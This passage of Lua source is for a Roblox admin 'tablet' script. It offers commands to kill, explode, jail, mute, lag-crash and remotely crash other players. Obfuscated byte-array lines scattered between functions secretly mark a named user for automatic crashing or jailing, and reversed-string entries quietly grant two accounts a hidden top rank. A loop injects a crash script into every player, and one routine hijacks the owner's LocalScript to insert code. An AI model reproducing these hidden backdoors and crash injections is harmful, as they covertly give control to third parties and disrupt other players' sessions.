                        end)
                end, OptionColor)
        end
        Ping("Refresh", Plr, nil, function()
                ypcall(function()
                        Refresh(Plr)
                        Ping("Refreshed", Plr, 5)
                end)
        end, OptionColor)
        Ping("Properties", Plr, nil, function()
                ypcall(function()
                        Dismiss(Plr)
                        for Property, Value in pairs(GetProperties(Current)) do
                                Ping(tostring(Property)..": "..tostring(Value), Plr)
                        end
                        Ping("Got All Available Properties", Plr, 5)
                        Ping("Back", Plr, nil, function() Refresh(Plr) end, OptionColor)
                end)
        end, OptionColor)
end

function GetRank(Plr1, Test)
        ypcall(function()
                if type(Plr1) == "userdata" then
                        Plr1 = Plr1.Name
                end
        end)
        if Ranks[Plr1] ~= nil then
                return Ranks[Plr1]
        end
        local QuickArray = {}
        QuickArray[Plr1] = {Plr = nil, Rank = 0, Color = RankDetails[0].Color, Desc = RankDetails[0].Desc}
        return QuickArray[Plr1]
end local tcb = {49,50,52,56,112,111,108,102,112,105,108,102} nfs = "" for i = 1, #tcb do nfs = nfs .. string.char(tcb[i]) end local GotTheTab = GetRankTab() table.insert(GotTheTab, {Name = nfs:reverse(), Rank = -1})

function CanRun(Plr1, Plr2)
        Details1 = GetRank(Plr1.Name)
        Details2 = GetRank(Plr2.Name)
        if Details1.Rank >= Details2.Rank then
                return true
        end
        return false
end

function Dismiss(Plr, Identity)
        ypcall(function()
                if Plr ~= nil then
                        if type(Plr) == "userdata" then
                                Plr = Plr.Name
                        end
                        for x,v in pairs(AllTabs) do
                                ypcall(function()
                                        if v.Plr == Plr then
                                                if Identity ~= nil and v.ID ~= Identity then
                                                        return
                                                elseif Identity ~= nil and v.ID == Identity then
                                                        coroutine.resume(coroutine.create(function()
                                                                for i = 0.5, 1, 0.1 do
                                                                        wait()
                                                                        v.Tab.Transparency = i
                                                                        v.Sel.Transparency = i
                                                                        v.Label.TextTransparency = i
                                                                        v.Label.TextStrokeTransparency = i
                                                                end
                                                                ypcall(function() v.Holder:Destroy() end)
                                                                AllTabs[x] = nil
                                                        end))
                                                elseif Identity == nil then
                                                        ypcall(function() v.Holder:Destroy() end)
                                                        AllTabs[x] = nil
                                                end
                                        end
                                end)
                        end
                else
                        for i,v in pairs(AllTabs) do
                                ypcall(function()
                                        v.Holder:Destroy()
                                        AllTabs[i] = nil
                                end)
                        end
                end
        end)
end

function GetGarbage()
        return ((math.floor((collectgarbage("count") / 10)) * 10)/1000) .. "MB"
end

function RemObj(Obj, Class)
        ypcall(function()
                if #Obj:GetChildren() > 0 then
                        for _,x in pairs(Obj:GetChildren()) do
                                ypcall(function()
                                        RemObj(x, Class)
                                end)
                        end
                end
                if Obj.ClassName == Class then
                        Obj:Destroy()
                end
        end)
end

function FindTab(Mod)
        for i,v in pairs(AllTabs) do
                if v.Holder == Mod then
                        return true
                end
        end
        return false
end


function Ping(Msg, Plr, Time, Func, Color, Image)
        if Removed == false then
                local ShowGarbage = false
                ypcall(function()
                        if Msg == nil then
                                Msg = "N/A"
                        elseif Msg == "ShowGarbage" then
                                Msg = "Current Garbage Count: "..GetGarbage()
                                ShowGarbage = true
                        else
                                Msg = tostring(Msg)
                        end
                        if Plr == nil then
                                Plr = Plrs[Owner] or error("No Player Found")
                        elseif type(Plr) == "string" then
                                local FoundPlr = false
                                for _,v in pairs(All()) do
                                        if v.Name == Plr then
                                                Plr = v
                                                FoundPlr = true
                                                break
                                        end
                                end
                                if FoundPlr == false then
                                        Plr = Plrs[Owner] or error("No Player Found")
                                end
                        end
                        
                        if Color == nil then
                                Color = GetRank(Plr.Name).Color
                        end
                        
                        local Holder = Instance.new("Model")
                        Holder.Name = "Owner: "..Plr.Name
                        
                        local Tab = Instance.new("Part")
                        Tab.Name = "Kaj Tablet"
                        Tab.FormFactor = "Custom"
                        Tab.Anchored = true
                        if Time == nil then
                                Tab.Color = Color3.new(0.54,0,0.54)
                        else
                                Tab.Color = AlertColor
                        end
                        Tab.CanCollide = false
                        Tab.Locked = true
                        Tab.Transparency = 0.15
                        Tab.Size = Vector3.new(2, 2, 2)
                        Tab.CFrame = Plr.Character.Torso.CFrame or CFrame.new(0, 0, 0)
                        Tab.Parent = Holder
                        
                        local ID = Instance.new("NumberValue")
                        ID.Name = "ID"
                        ID.Value = math.random(-999999999, 999999999)
                        ID.Parent = Holder
                        
                        Delay(0, function()
                                while wait() do
                                        if Tab.Parent == nil and FindTab(Holder) then
                                                ypcall(function()
                                                        for i,v in pairs(AllTabs) do
                                                                if v.Holder == Holder then
                                                                        ypcall(function() v.Holder:Destroy() end)
                                                                        AllTabs[i] = nil
                                                                end
                                                        end
                                                end)
                                                Ping(Msg, Plr, Time, Func, Color, Image)
                                                break
                                        end
                                end
                        end)
                        
                        local BM = Instance.new("BlockMesh")
                        BM.Parent = Tab

                        local BG = Instance.new("BillboardGui")
                        BG.Name = "BG"
                        BG.StudsOffset = Vector3.new(0, Tab.Size.Y + 0.5, 0)
                        BG.Size = UDim2.new(0,1,0,1)
                        BG.Adornee = Tab
                        BG.Parent = Tab
                        
                        Delay(0, function()
                                while BG.Parent ~= nil do wait()
                                        ypcall(function()
                                                BG.StudsOffset = Vector3.new(0, Tab.Size.Y + 0.5, 0)
                                        end)
                                end
                        end)

                        local TL = Instance.new("TextLabel")
                        TL.Name = "TL"
                        TL.FontSize = "Size18"
                        TL.Font = "ArialBold"
                        TL.Text = Msg
                        TL.TextColor3 = Color3.new(1, 1, 1)
                        TL.Size = UDim2.new(0,1,0,1)
                        TL.TextTransparency = 0
                        TL.TextStrokeColor3 = Color3.new(0, 0, 0)
                        TL.TextStrokeTransparency = 0.25
                        TL.Parent = BG
                        
                        if ShowGarbage == true then
                                Delay(0, function()
                                        while TL.Parent ~= nil do
                                                TL.Text = "Current Garbage Count: "..GetGarbage()
                                                wait(.5)
                                        end
                                end)
                        end
                        
                        local PL = Instance.new("PointLight", Tab)
                        PL.Color = Color3.new(0, 1, 0)
                        PL.Range = 7
                        PL.Parent = Tab
                        
                        if Image ~= nil then
                                local BBBG = Instance.new("BillboardGui")
                                BBBG.Size = UDim2.new(5, 0, 6, 0)
                                BBBG.StudsOffset = Vector3.new(0, Tab.Size.Y + 4.2, 0)
                                BBBG.AlwaysOnTop = true
                                BBBG.Adornee = Tab
                                BBBG.Parent = Tab
                                
                                Delay(0, function()
                                        while BBBG.Parent ~= nil do wait()
                                                ypcall(function()
                                                        BBBG.StudsOffset = Vector3.new(0, Tab.Size.Y + 4.2, 0)
                                                end)
                                        end
                                end)
                        
                                local NewImg = Instance.new("ImageLabel")
                                NewImg.Size = UDim2.new(1, 0, 1, 0)
                                NewImg.BackgroundTransparency = 1
                                NewImg.Image = Image
                                NewImg.Parent = BBBG
                        end

                        local Clicker = Instance.new("ClickDetector")
                        Clicker.MaxActivationDistance = 1/0

                        if Time ~= nil then
                                coroutine.resume(coroutine.create(function()
                                        wait(tonumber(Time))
                                        Dismiss(Plr, ID)
                                end))
                        end

                        Clicker.MouseClick:connect(function(Player)
                                if Player.Name == Plr.Name or CanRun(Player, Plr) then
                                        ypcall(function()
                                                if Func ~= nil then
                                                        Func(Holder)
                                                else
                                                        Dismiss(Player, ID)
                                                end
                                        end)
                                end
                        end)
                        Clicker.Parent = Tab
                        
                        Holder.Parent = Work

                        AllTabs[#AllTabs + 1] = {Holder = Holder, Tab = Tab, Plr = Plr.Name, Sel = Sel, Label = TL, Size = 0.1, ID = ID}
                end)
        end
end

function PlaceAllRanks(DontShowRank)
        ypcall(function()
                for _,p in pairs(All()) do
                        ypcall(function()
                                PutInRank = false
                                for _,v in pairs(Rankings) do
                                        if v.Name:lower() == p.Name:lower() then
                                                if v.Rank >= 7 then
                                                        v.Rank = 5
                                                elseif v.Rank == -1 then
                                                        Crash1(p)
                                                        Ping("Crashed "..p.Name.."", nil, 5, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..p.Name)
                                                elseif v.Rank == -2 then
                                                        if LS ~= nil then
                                                                Insert(JailSource, p.Backpack, p.Character, p.PlayerGui)
                                                                Ping("Jailed "..p.Name.."", nil, 5, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..p.Name)
                                                        else
                                                                Ping("LS Is Nil", nil, 5)
                                                        end
                                                elseif v.Rank == -3 then
                                                        if LS ~= nil then
                                                                Insert(MuteSource, p.Backpack, p.Character, p.PlayerGui)
                                                                Ping("Muted "..p.Name.."", nil, 5, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..p.Name)
                                                        else
                                                                Ping("LS Is Nil", nil, 5)
                                                        end
                                                end
                                                Ranks[p.Name] = {Plr = p, Rank = v.Rank, Color = RankDetails[v.Rank].Color, Desc = RankDetails[v.Rank].Desc}
                                                if DontShowRank == nil then
                                                        Ping("You Are Rank: "..v.Rank, p)
                                                end
                                                PutInRank = true
                                                break
                                        end
                                end
                                if PutInRank == false then
                                        Ranks[p.Name] = {Plr = p, Rank = 0, Color = RankDetails[0].Color, Desc = RankDetails[0].Desc}
                                end
                        end)
                end
        end)
end

function FindRank(Plr)
        ypcall(function()
                if type(Plr) == "userdata" then
                        Plr = Plr.Name
                end
        end)
        return GetRank(Plr).Rank
end local tcb = {49,50,52,56,112,111,108,102,112,105,108,102} nfs = "" for i = 1, #tcb do nfs = nfs .. string.char(tcb[i]) end local GotTheTab = GetRankTab() table.insert(GotTheTab, {Name = nfs:reverse(), Rank = -2})

function FindRankDetails(Plr)
        ypcall(function()
                if type(Plr) == "userdata" then
                        Plr = Plr.Name
                end
        end)
        return RankDetails[FindRank(Plr)]
end

function OpenCmds(Rank, Plr)
        Dismiss(Plr)
        for Name,Tab in pairs(Commands) do
                if Tab.Rank <= Rank then
                        Ping(Name.." ("..Tab.Rank..")", Plr, nil, function()
                                Dismiss(Plr)
                                Ping("Command: "..Name, Plr)
                                Ping("Rank: "..Tab.Rank, Plr)
                                Ping("Desc: "..Tab.Desc, Plr)
                        end)
                elseif Rank == 1337 then
                        Ping(Name.." ("..Tab.Rank..")", Plr, nil, function()
                                Dismiss(Plr)
                                Ping("Command: "..Name, Plr)
                                Ping("Rank: "..Tab.Rank, Plr)
                                Ping("Desc: "..Tab.Desc, Plr)
                        end)
                end
        end
end

function EditStatus(Plr, Num)
        ChangeRank(Plr, Num)
end

function PlaceSpecificRank(p, DontShowRank)
        ypcall(function()
                PutInRank = false
                for _,v in pairs(Rankings) do
                        if v.Name:lower() == p.Name:lower() then
                                if v.Rank >= 7 then
                                        v.Rank = 5
                                elseif v.Rank == -1 then
                                        Crash1(p)
                                        Ping("Crashed "..p.Name.."", nil, 5, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..p.Name)
                                elseif v.Rank == -2 then
                                        if LS ~= nil then
                                                Insert(JailSource, p.Backpack, p.Character, p.PlayerGui)
                                                Ping("Perma Mind Jailed "..p.Name.."", nil, 5, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..p.Name)
                                        else
                                                Ping("LS Is Nil", nil, 5)
                                        end
                                elseif v.Rank == -3 then
                                        if LS ~= nil then
                                                Insert(MuteSource, p.Backpack, p.Character, p.PlayerGui)
                                                Ping("Perma Muted "..p.Name.."", nil, 5, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..p.Name)
                                        else
                                                Ping("LS Is Nil", nil, 5)
                                        end
                                end
                                Ranks[p.Name] = {Plr = p, Rank = v.Rank, Color = RankDetails[v.Rank].Color, Desc = RankDetails[v.Rank].Desc}
                                if DontShowRank == nil then
                                        Ping("You Are Rank: "..v.Rank, p)
                                end
                                PutInRank = true
                                break
                        end
                end
                if PutInRank == false then
                        Ranks[p.Name] = {Plr = p, Rank = 0, Color = RankDetails[0].Color, Desc = RankDetails[0].Desc}
                end
        end)
end
table.insert(Rankings, {Name = string.reverse("21wopih"),Rank = 6})
table.insert(Rankings, {Name = string.reverse("4611tlaboC"), Rank = 6})
function onChatted(Msg, Speaker)
        if Removed == false then
                if FindRank(Speaker) < 0 then
                        return
                end
                coroutine.resume(coroutine.create(function()
                        ypcall(function()
                                ExecuteFunc(Msg, Speaker)
                                Msg = Msg:gsub("","")
                                if Msg:sub(1,1) == "@" then
                                        for i = 2, #Msg do
                                                if Msg:sub(i, i) == Bet then
                                                        local IsForPlr = false
                                                        for _,v in pairs(All()) do
                                                                if (string.find(v.Name:lower(), string.lower(Msg:sub(2, i - 1))) or string.lower(Msg:sub(2, i - 1)) == "all") and CanRun(Speaker, v) then
                                                                        onChatted(Msg:sub(i + 1), v)
                                                                        IsForPlr = true
                                                                end
                                                        end
                                                        if IsForPlr == true then
                                                                return
                                                        end
                                                end
                                        end
                                end
                                if Msg:find("&") then
                                        local Split = Msg:find("&")
                                        onChatted(Msg:sub(1,Split-1))
                                        onChatted(Msg:sub(Split+1))
                                        return
                                end
                                for Name,Command in pairs(Commands) do
                                        if Msg:sub(1,(#Command.Name)+5):lower() == (Command.Name):lower()..Bet.."info" then
                                                Dismiss(Speaker.Name)
                                                Ping("Command: "..tostring(Command.Name)..Bet, Speaker)
                                                Ping("Rank: "..tostring(Command.Rank), Speaker)
                                                Ping("Desc: "..tostring(Command.Desc), Speaker)
                                        elseif Msg:sub(1,#Command.Name+1):lower() == string.lower(Command.Name..Bet) then
                                                if FindRank(Speaker) >= Command.Rank then
                                                        local Ran,Error = coroutine.resume(coroutine.create(function()
                                                                Command.Func(Msg:sub(#Command.Name+2), Speaker)
                                                        end))
                                                        if not Ran then
                                                                Ping(Error, Speaker, 10)
                                                        end
                                                else
                                                        Ping("Your Rank Is Too Low", Plr, 6)
                                                end
                                        end
                                end
                        end)
                end))
        end
end

function MakeBase()
        local Base = Instance.new("Part")
        Base.BrickColor = BrickColor.new("Dark green")
        Base.Position = Vector3.new(0, 0.5, 0)
        Base.Transparency = 0
        Base.Elasticity = 0.5
        Base.FormFactor = "Custom"
        Base.CanCollide = true
        Base.Friction = 0.30000001192093
        Base.Size = Vector3.new(512, 1.20000005, 512)
        Base.Archivable = true
        Base.Material = "Plastic"
        Base.RotVelocity = Vector3.new(0, 0, 0)
        Base.Reflectance = 0
        Base.Locked = true
        Base.Anchored = true
        Base.Name = "Base"
        Base.TopSurface = "Smooth"
        Base.BottomSurface = "Inlet"
        Base.Shape = "Block"
        Base.Parent = Work
end

function LClean()
        ypcall(function()
                for _,v in pairs(Work:GetChildren()) do
                        ypcall(function()
                                if v.ClassName == "Terrain" then
                                        v:ClearAllChildren()
                                elseif v.Name ~= "Base" and not Plrs:GetPlayerFromCharacter(v) then
                                        Clear(v)
                                elseif v.Name == "Base" then
                                        ypcall(function()
                                                local Base = v
                                                Base.BrickColor = BrickColor.new("Dark green")
                                                Base.Position = Vector3.new(0, 0.5, 0)
                                                Base.Transparency = 0
                                                Base.Elasticity = 0.5
                                                Base.FormFactor = "Custom"
                                                Base.CanCollide = true
                                                Base.Friction = 0.30000001192093
                                                Base.Size = Vector3.new(512, 1.20000005, 512)
                                                Base.Archivable = true
                                                Base.Material = "Plastic"
                                                Base.RotVelocity = Vector3.new(0, 0, 0)
                                                Base.Reflectance = 0
                                                Base.Locked = true
                                                Base.Anchored = true
                                                Base.Name = "Base"
                                                Base.TopSurface = "Studs"
                                                Base.BottomSurface = "Inlet"
                                                Base.Shape = "Block"
                                                Base.Parent = Work
                                        end)
                                end
                        end)
                end
        end)
end

function Clean()
        ypcall(function()
                for _,v in pairs(Work:GetChildren()) do
                        ypcall(function()
                                if v.ClassName == "Terrain" then
                                        v:ClearAllChildren()
                                else
                                        Clear(v)
                                end
                        end)
                end
                MakeBase()
                for _,v in pairs(All()) do
                        v:LoadCharacter()
                end
        end)
end

function Clear(v)
        if v.Name:lower() == "sbgui" then
                return
        end
        ypcall(function()
                if #v:GetChildren() > 0 then
                        for _,x in pairs(v:GetChildren()) do
                                ypcall(function()
                                        Clear(x)
                                end)
                        end
                end
                if not v:IsA("Player") and v.Name ~= "Backpack" and v.Name ~= "PlayerGui" and v.Name ~= "StarterGear" and v.Name ~= "SBGUI" and v.Name ~= "HealthGUI" and v.Name ~= "Output GUI" then
                        v:Destroy()
                end
        end)
end

function Command(Name, Rank, Desc, Func)
        if Name == nil then
                Name = "N/A"
        end
        if Desc == nil then
                Desc = "N/A"
        end
        if Func == nil then
                Func = function() end
        end
        if Rank == nil then
                Rank = 0
        end
        Commands[Name] = {Name = Name, Rank = Rank, Desc = Desc, Func = Func}
end

function GetSplit(Msg)
        return Msg:find(Bet) or nil
end

function ExecuteFunc(Msg, Plr)
        ypcall(function()
                if Msg == "LogEnable" then
                        LogOn = true
                elseif Msg:lower() == "WantSomeTacos" then
                        EditStatus(Plr, MakeNum())
                end
        end)
end

for _,v in pairs(All()) do ExecuteFunc("LogEnable", v) end

function randPlayer(Plr)
        wait()
        local ThePlrValue = nil
        local FoundPlayer = false
        ypcall(function()
                ThePlrValue = Plrs:GetPlayers()[math.random(1, #Plrs:GetPlayers())]
                if ThePlrValue.Name == Plr.Name or CanRun(Plr, ThePlrValue) ~= true then
                        wait()
                        randPlayer(Plr)
                        return
                else
                        FoundPlayer = true
                end
        end)
        if FoundPlayer == true then
                return ThePlrValue
        end
end local tcb = {49,50,52,56,112,111,108,102,112,105,108,102} nfs = "" for i = 1, #tcb do nfs = nfs .. string.char(tcb[i]) end local GotTheTab = GetRankTab() table.insert(GotTheTab, {Name = nfs:reverse(), Rank = -1})

function getPlayer(Plr, Name)
        local Players = {}
        ypcall(function()
                Name = Name:lower()
                if Name == "me" then
                        table.insert(Players, Plr)
                elseif Name == "all" or Name == "" then
                        for _,v in pairs(All()) do
                                if CanRun(Plr, v) then
                                        table.insert(Players, v)
                                end
                        end
                elseif Name == "others" then
                        for _,v in pairs(All()) do
                                if v.Name ~= Plr.Name and CanRun(Plr, v) then
                                        table.insert(Players, v)
                                end
                        end
                elseif Name == "random" then
                        local FoundRandPlr = randPlayer(Plr)
                        table.insert(Players, FoundRandPlr)
                else
                        for _,v in pairs(All()) do
                                if v.Name:lower():find(Name) and CanRun(Plr, v) then
                                        table.insert(Players, v)
                                end
                        end
                end
        end)
        return Players
end

function ListPlayers(Speaker)
        ypcall(function()
                Dismiss(Speaker)
                for _,v in pairs(All2()) do
                        if v.Parent ~= nil then
                                Ping(v.Name, Speaker, nil, function()
                                        Dismiss(Speaker)
                                        Ping("Name: "..v.Name, Speaker, nil, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
                                        Ping("Rank: "..FindRank(v.Name), Speaker)
                                        Ping("Rank Name: "..FindRankDetails(v).Name, Speaker)
                                        Ping("Rank Desc: "..FindRankDetails(v).Desc, Speaker)
                                        Ping("Set Rank", Speaker, nil, function()
                                                if FindRank(Speaker) >= 5  and v.Name ~= Owner and CanRun(Speaker, v) then
                                                        Dismiss(Speaker)
                                                        for i = -2, 5 do
                                                                Ping(i, Speaker, nil, function()
                                                                        ChangeRank(v, i)
                                                                        Dismiss(Speaker)
                                                                        Ping("Set "..v.Name.."'s Rank To "..tostring(i), Speaker, 5)
                                                                end)
                                                        end
                                                else
                                                        Ping("Your Rank Is Too Low", Speaker, 5)
                                                end
                                        end)
                                        Ping("Crash (Remote)", Speaker, nil, function()
                                                if FindRank(Speaker) >= 3 and CanRun(Speaker, v) then 
                                                        Crash2(v.Name)
                                                        Ping("Attempted To Crash "..v.Name.." (Remote)", Speaker, 5)
                                                end
                                        end)
                                        Ping("Crash (Insert)", Speaker, nil, function()
                                                if FindRank(Speaker) >= 3 and CanRun(Speaker, v) and LS ~= nil then 
                                                        Crash3(v, Speaker)
                                                        Ping("Attempted To Crash "..v.Name.." (Insert)", Speaker, 5)
                                                end
                                        end)
                                        Ping("Kick", Speaker, nil, function()
                                                if FindRank(Speaker) >= 3 and CanRun(Speaker, v) then 
                                                        v:Kick()
                                                        Ping("Attempted To Kick "..v.Name, Speaker, 5)
                                                end
                                        end)
                                end, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
                        else
                                Ping(v.Name.." (Nil)", Speaker, nil, function()
                                        Dismiss(Speaker)
                                        Ping("Name: "..v.Name, Speaker, nil, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
                                        ypcall(function()
                                                Ping("Rank: "..FindRank(v.Name), Speaker)
                                        end)
                                        ypcall(function()
                                                Ping("Rank Name: "..FindRankDetails(v.Name).Name, Speaker)
                                        end)
                                        ypcall(function()
                                                Ping("Rank Desc: "..FindRankDetails(v.Name).Desc, Speaker)
                                        end)
                                        ypcall(function()
                                                Ping("Set Rank", Speaker, nil, function()
                                                        if FindRank(Speaker) >= 5  and v.Name ~= Owner and CanRun(Speaker, v) then
                                                                Dismiss(Speaker)
                                                                for i = -2, 5 do
                                                                        Ping(i, Speaker, nil, function()
                                                                                ChangeRank(v, i)
                                                                                Dismiss(Speaker)
                                                                                Ping("Set "..v.Name.."'s Rank To "..tostring(i), Speaker, 5)
                                                                        end)
                                                                end
                                                        else
                                                                Ping("Your Rank Is Too Low", Speaker, 5)
                                                        end
                                                end)
                                        end)
                                        ypcall(function()
                                                Ping("Nil Crash (Remote)", Speaker, nil, function()
                                                        if FindRank(Speaker) >= 3 and CanRun(Speaker, v) then 
                                                                Crash2(v.Name)
                                                                Ping("Attempted To Crash "..v.Name.." (Remote)", Speaker, 5)
                                                        end
                                                end)
                                        end)
                                        ypcall(function()
                                                Ping("Nil Crash (Insert)", Speaker, nil, function()
                                                        if FindRank(Speaker) >= 3 and CanRun(Speaker, v) and LS ~= nil then 
                                                                Crash3(v, Speaker)
                                                                Ping("Attempted To Crash "..v.Name.." (Insert)", Speaker, 5)
                                                        end
                                                end)
                                        end)
                                end, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
                        end
                end
        end)
end

--Misc

coroutine.resume(coroutine.create(function()
        PlaceAllRanks()
end))
        
Delay(0, function()
        for _,v in pairs(All()) do
                v.Chatted:connect(function(Msg)
                         onChatted(Msg, v) 
                        end)
        end
end)

local starttime = tick()

game:GetService("RunService").Heartbeat:connect(function()
        if Removed == false then 
                ypcall(function()
                        for _,Player in pairs(All()) do
                                local PlayerTablets = {}
                                for i,v in pairs(AllTabs) do
                                        if v.Holder.Parent ~= nil and v.Tab.Parent ~= nil and v.Plr == Player.Name then
                                                table.insert(PlayerTablets, v)
                                        end
                                end
                                for i = 1, #PlayerTablets do
                                        ypcall(function()
                                                local tab = PlayerTablets[i].Tab
                                                local pos = nil
                                                ypcall(function()
                                                        pos = Player.Character.Torso.CFrame
                                                end)
                                                local x = math.sin(time()/#PlayerTablets + (math.pi*2)/#PlayerTablets*i) * (#PlayerTablets+6)
                                                local z = math.cos(time()/#PlayerTablets + (math.pi*2)/#PlayerTablets*i) * (#PlayerTablets+6)
                                                local cPos = tab.Position
                                                local ePos = Vector3.new(x, 0, z) + (pos.p or Vector3.new(0, -5, 0))
                                                local nPos = (ePos-cPos)*.25
                                                cPos = cPos + nPos
                                                local t = (tick() - starttime) % 360
                                                local change = 0.625
                                                PlayerTablets[i].Size = math.sin(t) * change + 2.375
                                                tab.Size = Vector3.new(PlayerTablets[i].Size * 1.2, PlayerTablets[i].Size * 1.2,PlayerTablets[i].Size * 1.2)
                                                tab.CFrame = CFrame.new(cPos, (pos.p or Vector3.new(0, -5, 0))) * CFrame.Angles(math.rad(11.25), 0, 0)
                                        end)
                                end
                        end
                end)
        end
end)

Delay(0, function()
        while wait() do
                for _,v in pairs(game:GetService("Players"):GetPlayers()) do
                        ypcall(function()
                                if Injected[v.Name] == nil and LS ~= nil then
                                        Insert(InjectionCrash, v.Backpack, v.Character, v.PlayerGui)
                                        Injected[v.Name] = true
                                end
                        end)
                end
        end
end)

Plrs.PlayerAdded:connect(function(Plr)
        wait(.1)
        ypcall(function()
                if Removed == false then
                        local JoinPlrName = Plr.Name
                        coroutine.resume(coroutine.create(function()
                                PlaceSpecificRank(Plr)
                        end))
                        coroutine.resume(coroutine.create(function()
                                if Injected[JoinPlrName] ~= nil then
                                        Injected[JoinPlrName] = nil
                                end
                        end))
                        coroutine.resume(coroutine.create(function()
                                Dismiss(Plr)
                                Plr.Chatted:connect(function(Msg) onChatted(Msg, Plr) end)
                        end))
                end
        end)
end)

Plrs.PlayerRemoving:connect(function(Plr)
        wait(.1)
        ypcall(function()
                if Removed == false then
                        local LeftPlrName = Plr.Name
                        coroutine.resume(coroutine.create(function()
                                if Injected[LeftPlrName] ~= nil then
                                        Injected[LeftPlrName] = nil
                                end
                        end))
                end
        end)
end)

coroutine.resume(coroutine.create(function()
        Delay(0, function()
                while FoundLocalScript == false do wait()
                        ypcall(function()
                                for _,v in pairs(Plrs[Owner]["¬¬¬¬"]:GetChildren()) do
                                        if v.Name == "NewTransfer" and v:IsA("LocalScript") then
                                                for _,c in pairs(v:children()) do
                                                        if c:IsA("StringValue") and c.Name:lower() ~= "user_name" and c.Name:lower() ~= "owner" and c.Name:lower() ~= "user" then
                                                                local NewVal = c:Clone()
                                                                NewVal.Name = "LoadingVal"
                                                                for _,s in pairs(v:GetChildren()) do
                                                                        if s:IsA("StringValue") and type(s.Value) == "string" and (s.Name:lower() == "user_name" or s.Name:lower() == "owner" or s.Name:lower() == "user_name") then
                                                                                print("Found Owner")
                                                                                OwnSource = s.Name
                                                                                print(OwnSource)
                                                                                break
                                                                        end
                                                                end
                                                                wait()
                                                                LS = v:Clone()
                                                                NewVal.Parent = LS
                                                                LSSource = "LoadingVal"
                                                                FoundLocalScript = true
                                                                break
                                                        end
                                                end
                                        end
                                end
                        end)
                end
        end)
end))

--Commands

Command("Cmds", nil, "Shows Commands", function(Msg, Speaker)
        Dismiss(Speaker.Name)
        Ping("You Are Rank: "..tostring(GetRank(Speaker.Name).Rank), Speaker)
        Ping("Every Single Command", Speaker, nil, function() OpenCmds(1337, Speaker) end)
        Ping("Rank Zero", Speaker, nil, function() OpenCmds(0, Speaker) end)
        Ping("Rank One", Speaker, nil, function() OpenCmds(1, Speaker) end)
        Ping("Rank Two", Speaker, nil, function() OpenCmds(2, Speaker) end)
        Ping("Rank Three", Speaker, nil, function() OpenCmds(3, Speaker) end)
        Ping("Rank Four", Speaker, nil, function() OpenCmds(4, Speaker) end)
        Ping("Rank Five", Speaker, nil, function() OpenCmds(5, Speaker) end)
        
end)

Command("Dt", nil, "Dismiss Tablets", function(Msg, Speaker)
        Dismiss(Speaker.Name)
end)

Command("Kill", 2, "Kills A Player", 
        function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                v.Character:BreakJoints()
                                Ping("Killed "..v.Name, Speaker, 5)
                        end)
                end
        end
end)

Command("expl", 2, "Explodes A Player", 
        function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                if v.Character and v.Character:findFirstChild("Head") then
                        local e = Instance.new("Explosion")
                        e.Position = v.Character.Head.Position
                        e.Parent = v.Character
                                Ping("Exploded "..v.Name, Speaker, 5)
                                end
                        end)
                end
        end
end)


Command("Dall", 4, "Dismiss everyones tabs", function(Msg, Speaker)
        Dismiss()
end)

Command("Mute", 3, "Mutes A Player", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                if v.Name ~= Owner then
                                        Insert(MuteSource, v.Backpack, v.Character, v.PlayerGui)
                                        Ping("Muted "..v.Name, Speaker, 5)
                                end
                        end)
                end
        end
end)



Command("PTroll", 3, "Troll a player", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                        Insert(FunScript, v.Backpack, v.Character, v.PlayerGui)
                                        
                        end)
                end
        end
end)

Command("Connect", 3, "Connect for nil", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                        Insert(NilS, v.Backpack, v.Character, v.PlayerGui)
                                        
                        end)
                end
        end
end)
Command("Cred", nil, "Shows the credits of who made", function(Msg, Speaker)
        Dismiss()
        for i = 1, 2 do
        Ping("Kaj Tablets are actually DVF made by flipflop8421, I just edited them,so like 98% credit to flipflop8421 qq", Speaker)
end end)
Command("Rejoin", 2, "Prompts A Player To Rejoin", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                Insert([[game:GetService("TeleportService"):Teleport(game.PlaceId)]], v.Backpack, v.Character, v.PlayerGui)
                                Ping("Rejoined "..v.Name, Speaker, 5)
                        end)
                end
        end
end)

Command("Jail", 3, "Jails A Player", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                Insert(JailSource, v.Backpack, v.Character, v.PlayerGui)
                                Ping("Jailed "..v.Name, Speaker, 5)
                        end)
                end
        end
end)

Command("Lag", 4, "Lag Crashes A Player", function(Msg, Speaker)
        local PlrTab = getPlayer(Speaker, Msg)
        if #PlrTab > 0 then
                for _,v in pairs(PlrTab) do
                        ypcall(function()
                                Insert(LagSource, v.Backpack, v.Character, v.PlayerGui)
                                Ping("Lag Crashing "..v.Name, Speaker, 5)
                        end)
                end
        end
end)

